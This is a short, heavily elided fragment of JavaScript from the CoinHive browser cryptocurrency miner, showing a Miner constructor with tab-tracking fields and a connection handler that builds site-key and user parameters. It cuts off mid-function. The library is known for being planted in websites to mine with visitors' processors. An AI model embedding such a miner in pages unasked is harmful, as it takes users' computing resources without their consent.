;(function(window) {
  ...
  var Miner = function(siteKey, params) {
    ...
    this._tab = { ident: (Math.random() * 16777215) | 0, mode: CoinHive.IF_EXCLUSIVE_TAB, grace: 0, lastPingReceived: 0, interval: null }
  ...
  Miner.prototype._onOpen = function(ev) {
    this._emit('open')
    var params = { site_key: this._siteKey, type: 'anonymous', user: null, goal: 0 }
    if (this._user) {
      params.type = 'user'
